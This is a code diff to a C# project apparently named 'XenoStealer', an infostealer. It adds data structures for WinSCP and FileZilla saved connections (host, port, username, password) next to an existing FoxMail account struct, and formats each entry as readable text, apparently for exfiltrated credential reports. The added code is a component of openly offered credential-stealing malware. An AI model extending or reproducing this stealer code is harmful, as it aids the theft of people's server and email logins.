@@ -9,6 +9,60 @@ namespace XenoStealer
 {
     public static class DataExtractionStructs
     {
+
+        public struct WinScpInfo 
+        {
+            public string hostname;
+            public int port;
+            public string username;
+            public string password;
+            public WinScpInfo(string _hostname, int _port, string _username, string _password)
+            {
+                hostname = _hostname;
+                port = _port;
+                username = _username;
+                password = _password;
+            }
+            public override string ToString()
+            {
+                string result = "HOSTNAME: " + hostname;
+                result += Environment.NewLine;
+                result += "PORT: " + port.ToString();
+                result += Environment.NewLine;
+                result += "USERNAME: " + username;
+                result += Environment.NewLine;
+                result += "PASSWORD: " + password;
+                return result;
+            }
+        }
+
+        public struct FileZillaInfo
+        {
+            public string host;
+            public int port;
+            public string username;
+            public string password;
+            public FileZillaInfo(string _host, int _port, string _username, string _password)
+            {
+                host = _host;
+                port = _port;
+                username = _username;
+                password = _password;
+            }
+
+            public override string ToString()
+            {
+                string result = "HOST: " + host;
+                result += Environment.NewLine;
+                result += "PORT: " + port.ToString();
+                result += Environment.NewLine;
+                result += "USERNAME: " + username;
+                result += Environment.NewLine;
+                result += "PASSWORD: " + password;
+                return result.ToString();
+            }
+        }
+
         public struct FoxMailInfo 
         {
             public string account;
